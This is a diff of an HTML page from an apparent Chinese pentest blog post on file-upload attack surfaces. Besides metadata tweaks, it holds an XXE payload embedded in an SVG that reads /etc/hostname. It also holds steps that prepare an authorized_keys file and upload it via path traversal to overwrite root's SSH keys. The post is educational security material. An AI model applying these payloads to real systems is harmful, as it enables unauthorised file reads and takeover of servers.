@@ -10,7 +10,7 @@
 <meta name="description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。" /><meta name="keywords" content='File, Upload' /><meta itemprop="name" content="文件上传攻击面&amp;案例">
 <meta itemprop="description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。"><meta itemprop="datePublished" content="2024-10-21T02:49:14+00:00" />
 <meta itemprop="dateModified" content="2024-10-21T02:49:14+00:00" />
-<meta itemprop="wordCount" content="5781">
+<meta itemprop="wordCount" content="5784">
 <meta itemprop="keywords" content="Pentest,FileUpload," /><meta property="og:title" content="文件上传攻击面&amp;案例" />
 <meta property="og:description" content="简述一些文件上传场景下的攻击面，并提供一些漏洞案例。" />
 <meta property="og:type" content="article" />
@@ -23,7 +23,7 @@
 <meta name="application-name" content="Xavier&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/file-upload-attack-surface-and-cases/" /><link rel="prev" href="https://www.bthoughts.top/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/file-upload-attack-surface-and-cases/" /><link rel="prev" href="https://www.bthoughts.top/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" /><link rel="next" href="https://www.bthoughts.top/posts/burp-cph-usage/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/file-upload-attack-surface-and-cases\/"
-    },"genre": "posts","keywords": "Pentest, FileUpload","wordcount":  5781 ,
+    },"genre": "posts","keywords": "Pentest, FileUpload","wordcount":  5784 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/file-upload-attack-surface-and-cases\/","datePublished": "2024-10-21T02:49:14+00:00","dateModified": "2024-10-21T02:49:14+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1><p class="single-subtitle animate__animated animate__fadeIn">File Upload Attack Surface and Cases</p></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/pentest/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div>
-      <div class="post-meta-line"><span title=2024-10-21&#32;02:49:14><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-10-21">2024-10-21</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 5781 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 12 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2024-10-21&#32;02:49:14><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-10-21">2024-10-21</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 5784 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 12 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -516,9 +516,17 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;128px&#34;</span> <span class="na">height=</span><span class="s">&#34;128px&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span><span class="nt">&gt;&lt;text</span> <span class="na">font-size=</span><span class="s">&#34;16&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;16&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;&lt;/svg&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;128px&#34;</span> <span class="na">height=</span><span class="s">&#34;128px&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text</span> <span class="na">font-size=</span><span class="s">&#34;16&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;16&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>恶意的XXE文档生成：<a href="https://github.com/whitel1st/docem.git"target="_blank" rel="external nofollow noopener noreferrer">docem</a></p>
@@ -814,12 +822,12 @@
 </span></span><span class="line"><span class="cl">Your identification has been saved in fileup  
 </span></span><span class="line"><span class="cl">Your public key has been saved in fileup.pub  
 </span></span><span class="line"><span class="cl">...  
-</span></span><span class="line"><span class="cl">​  
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">kali@kali:~$ cat fileup.pub &gt; authorized_keys
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
-<p>清单 37 - 为文件上传准备authorized_keys 文件</p>
+<p>为文件上传准备authorized_keys 文件</p>
 </blockquote>
 <p>使用相对路径 <code>../../../../../../../root/.ssh/authorized_keys</code> 上传它进行覆盖。</p>
 <h3 id="ssrf-1">SSRF</h3>
@@ -940,7 +948,8 @@
     </section>
   </div>
 
-  <div class="post-nav"><a href="/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" class="post-nav-item" rel="prev" title="Docker低版本升级"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Docker低版本升级</a></div>
+  <div class="post-nav"><a href="/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/" class="post-nav-item" rel="prev" title="Docker低版本升级"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Docker低版本升级</a>
+      <a href="/posts/burp-cph-usage/" class="post-nav-item" rel="next" title="Burp-CPH插件心得">Burp-CPH插件心得<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"><div id="giscus">
           <script
